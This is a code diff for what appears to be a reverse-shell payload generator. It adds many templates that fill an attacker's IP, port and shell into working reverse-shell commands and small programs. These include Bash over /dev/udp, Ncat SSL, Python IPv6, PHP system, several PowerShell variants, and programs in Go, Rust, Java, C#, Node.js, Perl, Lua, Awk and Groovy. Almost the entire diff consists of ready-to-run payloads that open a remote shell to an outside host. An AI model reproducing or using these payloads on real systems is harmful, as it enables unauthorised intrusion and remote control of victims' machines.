@@ -492,6 +492,13 @@
                 template: (ip, port, shell) => `0<&196;exec 196<>/dev/tcp/${ip}/${port}; ${shell} <&196 >&196 2>&196`
             },
             {
+                name: "Bash UDP",
+                platform: "Linux",
+                badge: "UDP",
+                badgeClass: "badge-warning",
+                template: (ip, port, shell) => `${shell} -i >& /dev/udp/${ip}/${port} 0>&1`
+            },
+            {
                 name: "Netcat traditional",
                 platform: "Linux",
                 badge: "TCP",
@@ -506,32 +513,46 @@
                 template: (ip, port, shell) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${ip} ${port} >/tmp/f`
             },
             {
-                name: "Python3",
+                name: "Ncat SSL",
+                platform: "Linux",
+                badge: "SSL",
+                badgeClass: "badge-secondary",
+                template: (ip, port, shell) => `ncat --ssl ${ip} ${port} -e ${shell}`
+            },
+            {
+                name: "Python3 Short",
                 platform: "Linux",
                 badge: "TCP",
                 badgeClass: "badge-primary",
                 template: (ip, port, shell) => `python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("${shell}")'`
             },
             {
-                name: "Python3 Export",
+                name: "Python3 IPv6",
                 platform: "Linux",
-                badge: "PTY",
+                badge: "IPv6",
                 badgeClass: "badge-secondary",
-                template: (ip, port, shell) => `export RHOST="${ip}";export RPORT=${port};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("${shell}")'`
+                template: (ip, port, shell) => `python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("${shell}")'`
             },
             {
                 name: "PHP Socket",
                 platform: "Web",
-                badge: "TCP",
+                badge: "WEB",
                 badgeClass: "badge-warning",
                 template: (ip, port, shell) => `php -r '$sock=fsockopen("${ip}",${port});exec("${shell} <&3 >&3 2>&3");'`
             },
             {
                 name: "PHP proc_open",
                 platform: "Web",
-                badge: "TCP",
+                badge: "WEB",
                 badgeClass: "badge-warning",
                 template: (ip, port, shell) => `php -r '$sock=fsockopen("${ip}",${port});$proc=proc_open("${shell}",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'`
+            },
+            {
+                name: "PHP system",
+                platform: "Web",
+                badge: "WEB",
+                badgeClass: "badge-warning",
+                template: (ip, port, shell) => `php -r 'system("${shell} -i >& /dev/tcp/${ip}/${port} 0>&1");'`
             },
             {
                 name: "PowerShell IEX",
@@ -541,18 +562,46 @@
                 template: (ip, port) => `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${ip}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`
             },
             {
-                name: "PowerShell Short",
+                name: "PowerShell .NET",
                 platform: "Windows",
                 badge: "WIN",
                 badgeClass: "badge-secondary",
-                template: (ip, port) => `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$snb = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($snb,0,$snb.Length);$s.Flush()};$client.Close()"`
+                template: (ip, port) => `$c = New-Object System.Net.Sockets.TCPClient("${ip}",${port});$s = $c.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb = (iex $d 2>&1 | Out-String);$sb2 = $sb + "PS " + (pwd).Path + "> ";$snb = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($snb,0,$snb.Length);$s.Flush()};$c.Close()`
             },
             {
-                name: "Perl",
+                name: "Go Reverse",
                 platform: "Linux",
-                badge: "TCP",
+                badge: "BINARY",
                 badgeClass: "badge-primary",
-                template: (ip, port, shell) => `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("${shell} -i");};'`
+                template: (ip, port, shell) => `package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","${ip}:${port}");cmd:=exec.Command("${shell}");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}`
+            },
+            {
+                name: "Rust Reverse",
+                platform: "Linux",
+                badge: "BINARY",
+                badgeClass: "badge-primary",
+                template: (ip, port, shell) => `use std::net::TcpStream;use std::os::unix::io::{AsRawFd, FromRawFd};use std::process::{Command, Stdio};fn main(){let s=TcpStream::connect("${ip}:${port}").unwrap();let fd=s.as_raw_fd();Command::new("${shell}").arg("-i").stdin(unsafe{Stdio::from_raw_fd(fd)}).stdout(unsafe{Stdio::from_raw_fd(fd)}).stderr(unsafe{Stdio::from_raw_fd(fd)}).spawn().unwrap().wait().unwrap();}`
+            },
+            {
+                name: "Java Reverse",
+                platform: "Linux",
+                badge: "JVM",
+                badgeClass: "badge-warning",
+                template: (ip, port, shell) => `public class R{public static void main(String[] a)throws Exception{Process p=new ProcessBuilder("${shell}","-i").redirectErrorStream(true).start();java.net.Socket s=new java.net.Socket("${ip}",${port});java.io.InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();java.io.OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}}}}`
+            },
+            {
+                name: "C# Reverse",
+                platform: "Windows",
+                badge: "DOTNET",
+                badgeClass: "badge-secondary",
+                template: (ip, port) => `using System;using System.Net.Sockets;using System.IO;using System.Diagnostics;class R{static void Main(){using(TcpClient c=new TcpClient("${ip}",${port})){using(Stream s=c.GetStream()){using(StreamReader r=new StreamReader(s)){using(StreamWriter w=new StreamWriter(s)){w.AutoFlush=true;Process p=new Process();p.StartInfo.FileName="cmd.exe";p.StartInfo.CreateNoWindow=true;p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardOutput=true;p.StartInfo.RedirectStandardInput=true;p.StartInfo.RedirectStandardError=true;p.OutputDataReceived+=(sender,e)=>{w.WriteLine(e.Data);};p.ErrorDataReceived+=(sender,e)=>{w.WriteLine(e.Data);};p.Start();p.BeginOutputReadLine();p.BeginErrorReadLine();while(!p.HasExited){p.StandardInput.WriteLine(r.ReadLine());}}}}}}}`
+            },
+            {
+                name: "Node.js",
+                platform: "Linux",
+                badge: "JS",
+                badgeClass: "badge-warning",
+                template: (ip, port, shell) => `(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("${shell}",["-i"]);var client=new net.Socket();client.connect(${port},"${ip}",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();`
             },
             {
                 name: "Ruby",
@@ -562,11 +611,39 @@
                 template: (ip, port, shell) => `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("${shell} -i <&%d >&%d 2>&%d",f,f,f)'`
             },
             {
+                name: "Perl",
+                platform: "Linux",
+                badge: "TCP",
+                badgeClass: "badge-primary",
+                template: (ip, port, shell) => `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("${shell} -i");};'`
+            },
+            {
                 name: "Socat",
                 platform: "Linux",
                 badge: "TTY",
                 badgeClass: "badge-secondary",
                 template: (ip, port, shell) => `socat TCP:${ip}:${port} EXEC:${shell},pty,stderr,setsid,sigint,sane`
+            },
+            {
+                name: "Lua",
+                platform: "Linux",
+                badge: "TCP",
+                badgeClass: "badge-primary",
+                template: (ip, port, shell) => `lua -e "local s=require('socket');local t=assert(s.tcp());t:connect('${ip}',${port});while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));t:send(f:read('*all'));f:close() end"`
+            },
+            {
+                name: "Awk",
+                platform: "Linux",
+                badge: "TCP",
+                badgeClass: "badge-primary",
+                template: (ip, port) => `awk 'BEGIN {s = "/inet/tcp/0/${ip}/${port}"; while(4) { do{ printf "shell>" |& s; s |& getline c; if(c){ system(c) |& s; } } while(c != "exit") close(s); }}'`
+            },
+            {
+                name: "Groovy",
+                platform: "Linux",
+                badge: "JVM",
+                badgeClass: "badge-warning",
+                template: (ip, port, shell) => `String host="${ip}";int port=${port};String cmd="${shell}";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}}s.close();`
             },
             {
                 name: "Netcat Listener",
